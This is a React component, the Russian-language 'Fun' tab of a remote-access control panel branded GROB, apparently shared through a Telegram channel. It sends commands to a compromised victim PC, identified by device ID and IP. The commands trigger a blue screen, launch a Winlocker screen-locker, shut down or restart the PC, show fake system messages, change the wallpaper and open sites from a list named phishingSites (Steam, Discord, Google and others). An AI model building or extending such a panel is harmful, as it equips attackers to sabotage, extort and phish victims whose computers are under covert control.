// t.me/SentinelLinks

"use client"

import { useState } from "react"
import {
  Gamepad2,
  Volume2,
  AlertTriangle,
  Power,
  RotateCcw,
  WifiOff,
  Info,
  CircleAlert,
  XCircle,
  HelpCircle,
  Globe,
  ExternalLink,
  Skull,
  ImageIcon,
} from "lucide-react"
import type { User } from "@/app/page"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { toast } from "sonner"

interface FunTabProps {
  selectedUser: User | null
}

// t.me/SentinelLinks
export function FunTab({ selectedUser }: FunTabProps) {
  const [isShaking, setIsShaking] = useState(false)
  const [isSoundPlaying, setIsSoundPlaying] = useState(false)
  const [customMessage, setCustomMessage] = useState("Привет от GROB!")
  const [messageTitle, setMessageTitle] = useState("Уведомление")
  const [messageType, setMessageType] = useState("info")
  const [selectedSite, setSelectedSite] = useState("steam")
  const [customUrl, setCustomUrl] = useState("")
  const [wallpaperUrl, setWallpaperUrl] = useState("")

  const messageTypes = [
    { value: "info", label: "Информация", icon: Info, color: "from-blue-500 to-cyan-500" },
    { value: "warning", label: "Предупреждение", icon: CircleAlert, color: "from-yellow-500 to-orange-500" },
    { value: "error", label: "Ошибка", icon: XCircle, color: "from-red-500 to-rose-500" },
    { value: "question", label: "Вопрос", icon: HelpCircle, color: "from-purple-500 to-pink-500" },
  ]

  const phishingSites = [
    { value: "steam", label: "Steam", url: "https://steamcommunity.com" },
    { value: "discord", label: "Discord", url: "https://discord.com" },
    { value: "vk", label: "VK", url: "https://vk.com" },
    { value: "telegram", label: "Telegram Web", url: "https://web.telegram.org" },
    { value: "google", label: "Google", url: "https://accounts.google.com" },
    { value: "custom", label: "Свой URL", url: "" },
  ]

// t.me/SentinelLinks
  const sendFunCommand = async (action: string, data?: any) => {
    if (!selectedUser) return

    try {
      const response = await fetch("/api/fun", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          deviceId: selectedUser.id,
          action,
          data,
        }),
      })

      const result = await response.json()

      if (response.ok) {
        toast.success("Команда выполнена", {
          description: result.message || "Успешно",
        })
        return true
      } else {
        toast.error("Ошибка отправки команды", {
          description: result.error || "Сервер недоступен",
        })
        return false
      }
    } catch (error) {
      console.error("Fun command error:", error)
      toast.error("Ошибка подключения", {
        description: "WebSocket сервер недоступен",
      })
      return false
    }
  }

  const funActions = [
    {
      id: "shake",
      name: "Потрясти экран",
      icon: RotateCcw,
      color: "from-blue-500 to-cyan-500",
      action: async () => {
        setIsShaking(true)
        await sendFunCommand("shake")
        setTimeout(() => setIsShaking(false), 2000)
      },
    },
    {
      id: "sound",
      name: "Проиграть звук",
      icon: Volume2,
      color: "from-purple-500 to-pink-500",
      action: async () => {
        setIsSoundPlaying(true)
        await sendFunCommand("sound")
        setTimeout(() => setIsSoundPlaying(false), 1000)
      },
    },
    {
      id: "bsod",
      name: "BSOD (Синий экран)",
      icon: Skull,
      color: "from-blue-600 to-indigo-700",
      action: async () => {
        if (confirm("⚠️ ВНИМАНИЕ! Это вызовет синий экран смерти на удаленном ПК. Продолжить?")) {
          await sendFunCommand("bsod")
        }
      },
    },
    {
      id: "winlocker",
      name: "Winlocker",
      icon: Skull,
      color: "from-red-600 to-rose-700",
      action: async () => {
        if (confirm("⚠️ ВНИМАНИЕ! Это запустит Winlocker на удаленном ПК. Продолжить?")) {
          await sendFunCommand("winlocker")
        }
      },
    },
    {
      id: "restart",
      name: "Перезагрузить",
      icon: Power,
      color: "from-orange-500 to-red-500",
      action: async () => {
        if (confirm("Вы уверены, что хотите перезагрузить удаленный ПК?")) {
          await sendFunCommand("restart")
        }
      },
    },
    {
      id: "shutdown",
      name: "Выключить",
      icon: Power,
      color: "from-red-500 to-rose-500",
      action: async () => {
        if (confirm("Вы уверены, что хотите выключить удаленный ПК?")) {
          await sendFunCommand("shutdown")
        }
      },
    },
  ]

  const sendCustomMessage = async () => {
    if (customMessage.trim() && selectedUser) {
      const selectedType = messageTypes.find((t) => t.value === messageType)
      await sendFunCommand("message", {
        type: messageType,
        title: messageTitle,
        message: customMessage,
      })
      toast.success(`Сообщение "${selectedType?.label}" отправлено`, {
        description: customMessage.substring(0, 50) + (customMessage.length > 50 ? "..." : ""),
      })
    }
  }

  const openPhishingSite = async () => {
    if (!selectedUser) return

    const site = phishingSites.find((s) => s.value === selectedSite)
    const url = selectedSite === "custom" ? customUrl : site?.url

    if (!url) {
      toast.error("Введите URL", {
        description: "Укажите адрес сайта для открытия",
      })
      return
    }

    await sendFunCommand("openurl", { url })
    toast.success("Сайт открыт", {
      description: `Открыт ${site?.label || "сайт"} на удаленном ПК`,
    })
  }

  const changeWallpaper = async () => {
    if (!wallpaperUrl.trim()) {
      toast.error("Введите URL картинки")
      return
    }
    await sendFunCommand("wallpaper", { url: wallpaperUrl })
    toast.success("Обои изменены")
  }

  const currentMessageType = messageTypes.find((t) => t.value === messageType)
  const MessageIcon = currentMessageType?.icon || AlertTriangle

  if (!selectedUser) {
    return (
      <div className="flex-1 flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-primary/20 to-accent/20 flex items-center justify-center mx-auto mb-6">
            <WifiOff className="w-12 h-12 text-muted-foreground" />
          </div>
          <h3 className="text-xl font-semibold mb-2">Нет подключения</h3>
          <p className="text-muted-foreground">Выберите устройство для доступа к Fun функциям</p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex-1 bg-background p-6 overflow-auto">
      <div className="max-w-5xl mx-auto space-y-6">
        <div>
          <h2 className="text-2xl font-bold mb-2 bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
            Fun панель управления
          </h2>
          <p className="text-muted-foreground">Дополнительные возможности управления удаленным ПК</p>
        </div>

        <Card className="p-6 bg-card">
          <div className="flex items-start gap-4">
            <div
              className={`w-16 h-16 rounded-xl bg-gradient-to-br ${currentMessageType?.color} flex items-center justify-center flex-shrink-0`}
            >
              <MessageIcon className="w-8 h-8 text-white" />
            </div>
            <div className="flex-1">
              <h3 className="font-semibold text-lg mb-2">Показать сообщение</h3>
              <p className="text-sm text-muted-foreground mb-4">
                Выберите тип и введите текст для отображения на удаленном ПК
              </p>
              <div className="space-y-3">
                <Select value={messageType} onValueChange={setMessageType}>
                  <SelectTrigger className="w-full">
                    <SelectValue placeholder="Выберите тип сообщения" />
                  </SelectTrigger>
                  <SelectContent>
                    {messageTypes.map((type) => {
                      const Icon = type.icon
                      return (
                        <SelectItem key={type.value} value={type.value}>
                          <div className="flex items-center gap-2">
                            <Icon className="w-4 h-4" />
                            {type.label}
                          </div>
                        </SelectItem>
                      )
                    })}
                  </SelectContent>
                </Select>
                <Input
                  value={messageTitle}
                  onChange={(e) => setMessageTitle(e.target.value)}
                  placeholder="Заголовок сообщения..."
                  className="w-full"
                />
                <div className="flex gap-2">
                  <Input
                    value={customMessage}
                    onChange={(e) => setCustomMessage(e.target.value)}
                    placeholder="Введите ваше сообщение..."
                    className="flex-1"
                    onKeyPress={(e) => {
                      if (e.key === "Enter") {
                        sendCustomMessage()
                      }
                    }}
                  />
                  <Button
                    onClick={sendCustomMessage}
                    className={`bg-gradient-to-r ${currentMessageType?.color} hover:opacity-90`}
                  >
                    Отправить
                  </Button>
                </div>
              </div>
            </div>
          </div>
        </Card>

        <Card className="p-6 bg-card">
          <div className="flex items-start gap-4">
            <div className="w-16 h-16 rounded-xl bg-gradient-to-br from-pink-500 to-rose-500 flex items-center justify-center flex-shrink-0">
              <ImageIcon className="w-8 h-8 text-white" />
            </div>
            <div className="flex-1">
              <h3 className="font-semibold text-lg mb-2">Изменить обои</h3>
              <p className="text-sm text-muted-foreground mb-4">
                Укажите URL картинки для установки как обои рабочего стола
              </p>
              <div className="flex gap-2">
                <Input
                  value={wallpaperUrl}
                  onChange={(e) => setWallpaperUrl(e.target.value)}
                  placeholder="https://example.com/image.jpg"
                  className="flex-1"
                />
                <Button
                  onClick={changeWallpaper}
                  className="bg-gradient-to-r from-pink-500 to-rose-500 hover:opacity-90"
                >
                  Установить
                </Button>
              </div>
            </div>
          </div>
        </Card>

        <Card className="p-6 bg-card">
          <div className="flex items-start gap-4">
            <div className="w-16 h-16 rounded-xl bg-gradient-to-br from-green-500 to-emerald-500 flex items-center justify-center flex-shrink-0">
              <Globe className="w-8 h-8 text-white" />
            </div>
            <div className="flex-1">
              <h3 className="font-semibold text-lg mb-2">Открыть сайт</h3>
              <p className="text-sm text-muted-foreground mb-4">Откройте выбранный сайт на удаленном ПК</p>
              <div className="space-y-3">
                <Select value={selectedSite} onValueChange={setSelectedSite}>
                  <SelectTrigger className="w-full">
                    <SelectValue placeholder="Выберите сайт" />
                  </SelectTrigger>
                  <SelectContent>
                    {phishingSites.map((site) => (
                      <SelectItem key={site.value} value={site.value}>
                        <div className="flex items-center gap-2">
                          <Globe className="w-4 h-4" />
                          {site.label}
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {selectedSite === "custom" && (
                  <Input
                    value={customUrl}
                    onChange={(e) => setCustomUrl(e.target.value)}
                    placeholder="https://example.com"
                    className="w-full"
                  />
                )}
                <Button
                  onClick={openPhishingSite}
                  className="w-full bg-gradient-to-r from-green-500 to-emerald-500 hover:opacity-90"
                >
                  <ExternalLink className="w-4 h-4 mr-2" />
                  Открыть сайт
                </Button>
              </div>
            </div>
          </div>
        </Card>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {funActions.map((action) => {
            const Icon = action.icon
            return (
              <Card
                key={action.id}
                className={`p-6 bg-card hover:shadow-xl transition-all cursor-pointer ${
                  isShaking && action.id === "shake" ? "animate-shake" : ""
                }`}
                onClick={action.action}
              >
                <div className="flex items-center gap-4">
                  <div
                    className={`w-16 h-16 rounded-xl bg-gradient-to-br ${action.color} flex items-center justify-center`}
                  >
                    <Icon className="w-8 h-8 text-white" />
                  </div>
                  <div>
                    <h3 className="font-semibold text-lg">{action.name}</h3>
                    <p className="text-sm text-muted-foreground">Нажмите для активации</p>
                  </div>
                </div>
              </Card>
            )
          })}
        </div>

        <Card className="p-6 bg-card">
          <div className="flex items-start gap-4">
            <Gamepad2 className="w-8 h-8 text-primary flex-shrink-0" />
            <div>
              <h3 className="font-semibold text-lg mb-2">Системная информация</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Устройство:</span>
                  <span className="font-mono">{selectedUser.name}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">IP адрес:</span>
                  <span className="font-mono">{selectedUser.ip}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">ОС:</span>
                  <span className="font-mono">{selectedUser.os}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Статус:</span>
                  <span className="font-mono text-green-500">Активно</span>
                </div>
              </div>
            </div>
          </div>
        </Card>
      </div>
    </div>
  )
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
